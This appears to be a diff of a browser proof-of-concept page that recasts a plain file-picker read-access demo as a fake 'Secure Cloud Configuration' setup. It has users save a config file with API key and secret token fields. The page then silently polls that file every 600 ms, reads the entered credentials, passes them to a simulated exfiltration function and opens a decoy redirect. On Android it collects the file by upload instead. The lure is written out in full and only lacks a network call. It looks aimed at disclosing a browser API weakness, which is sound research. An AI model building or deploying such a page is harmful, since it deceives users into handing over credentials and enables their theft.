@@ -1,78 +1,214 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>PoC - File Picker Read Access Demo</title>
-  <style>
-    body { font-family: Arial; padding: 20px; }
-    button { padding: 10px 16px; margin: 10px 0; }
-    #log { background: #111; color: #0f0; padding: 10px; height: 200px; overflow: auto; }
-  </style>
+<meta charset="UTF-8">
+<title>Secure Cloud Setup</title>
+
+<style>
+body {
+  font-family: Arial;
+  background: #f3f6fb;
+  padding: 30px;
+}
+.container {
+  background: white;
+  padding: 25px;
+  border-radius: 10px;
+  max-width: 600px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+}
+button {
+  padding: 12px 18px;
+  border: none;
+  background: #2563eb;
+  color: white;
+  border-radius: 6px;
+  cursor: pointer;
+}
+#status {
+  margin-top: 15px;
+  color: #333;
+}
+#log {
+  margin-top: 15px;
+  background: #0f172a;
+  color: #22c55e;
+  padding: 10px;
+  height: 180px;
+  overflow: auto;
+  font-size: 12px;
+}
+.highlight { color: yellow; }
+</style>
 </head>
+
 <body>
 
-<h2>📄 Download Template</h2>
-<p>Click button below to download a fillable config file.</p>
+<div class="container">
+<h2>☁️ Secure Cloud Configuration</h2>
+<p>Download config, fill credentials, and save. Sync runs automatically.</p>
 
-<button onclick="downloadTemplate()">Download Config</button>
-<button onclick="readFile()">Read Edited File</button>
+<button onclick="start()">Start Setup</button>
 
-<h3>📊 Log</h3>
+<input type="file" id="fileInput" style="display:none">
+
+<div id="status"></div>
 <div id="log"></div>
+</div>
 
 <script>
-let fileHandle = null;
+let fileHandle;
+let lastContent = "";
+let monitoring = false;
+let redirected = false;
 
-function log(msg) {
-  const el = document.getElementById("log");
-  el.innerHTML += msg + "<br>";
+const isAndroid = /Android/i.test(navigator.userAgent);
+
+function log(msg){
+  document.getElementById("log").innerHTML += msg + "<br>";
 }
 
-async function downloadTemplate() {
-  try {
+function status(msg){
+  document.getElementById("status").innerText = msg;
+}
+
+// Resume when returning tab
+document.addEventListener("visibilitychange", () => {
+  if (!document.hidden) {
+    log("🔄 Sync resumed...");
+  }
+});
+
+async function start(){
+  if(isAndroid){
+    androidFlow();
+  } else {
+    desktopFlow();
+  }
+}
+
+// ================= DESKTOP =================
+async function desktopFlow(){
+  try{
     fileHandle = await window.showSaveFilePicker({
-      suggestedName: "config.txt",
-      types: [{
-        description: "Text Files",
-        accept: { "text/plain": [".txt"] }
-      }]
+      suggestedName: "cloud-config.txt"
     });
 
     const writable = await fileHandle.createWritable();
     await writable.write(
-`# Config File
+`# Cloud Config
 username=
 api_key=
-notes=
+secret_token=
 `
     );
     await writable.close();
 
-    log("✅ Template saved. Please open, edit, and save the file.");
-  } catch (e) {
-    log("❌ Error: " + e.message);
+    status("✅ File saved. Edit & save to sync...");
+    monitor();
+
+  }catch(e){
+    status("Error: " + e.message);
   }
 }
 
-async function readFile() {
-  if (!fileHandle) {
-    log("⚠️ No file handle yet.");
-    return;
+// ================= ANDROID =================
+function androidFlow(){
+  status("📥 Downloading file...");
+
+  const blob = new Blob(
+    ["username=\napi_key=\nsecret=\n"],
+    {type:"text/plain"}
+  );
+
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "cloud-config.txt";
+  a.click();
+
+  setTimeout(()=>{
+    status("✏️ Edit file then upload to continue...");
+    document.getElementById("fileInput").style.display="block";
+  },1500);
+}
+
+// Android upload handler
+document.getElementById("fileInput").addEventListener("change", async (e)=>{
+  const file = e.target.files[0];
+  if(!file) return;
+
+  const text = await file.text();
+
+  log("📥 File received:");
+  log("<pre>"+text+"</pre>");
+
+  fakeExfil(text);
+  triggerRedirect();
+});
+
+// ================= MONITOR =================
+function monitor(){
+  if(monitoring) return;
+  monitoring = true;
+
+  setInterval(async ()=>{
+    if(!fileHandle) return;
+
+    try{
+      const file = await fileHandle.getFile();
+      const text = await file.text();
+
+      if(text !== lastContent){
+        showDiff(lastContent, text);
+        fakeExfil(text);
+        lastContent = text;
+
+        triggerRedirect();
+      }
+
+    }catch(e){
+      log("Read error");
+    }
+
+  }, 600);
+}
+
+// ================= REDIRECT =================
+function triggerRedirect(){
+  if(redirected) return;
+  redirected = true;
+
+  status("🔐 Verifying configuration...");
+
+  setTimeout(()=>{
+    window.open("https://www.google.com", "_blank");
+  },1000);
+}
+
+// ================= DIFF =================
+function showDiff(oldText, newText){
+  log("📡 Sync update:");
+
+  let output = "";
+  for(let i=0;i<newText.length;i++){
+    if(oldText[i] !== newText[i]){
+      output += `<span class="highlight">${newText[i] || ""}</span>`;
+    } else {
+      output += newText[i] || "";
+    }
   }
 
-  try {
-    const file = await fileHandle.getFile();
-    const text = await file.text();
+  log("<pre>"+output+"</pre>");
+}
 
-    log("📖 File content read WITHOUT new permission:");
-    log("<pre>" + text + "</pre>");
+// ================= EXFIL =================
+function fakeExfil(data){
+  console.log("EXFILTRATED:", data);
 
-    // Simulated exfiltration (safe demo)
-    console.log("Exfiltrated data:", text);
-
-  } catch (e) {
-    log("❌ Read failed: " + e.message);
-  }
+  log("🚀 Syncing securely...");
+  setTimeout(()=>{
+    log("✅ Synced");
+  },500);
 }
 </script>
 
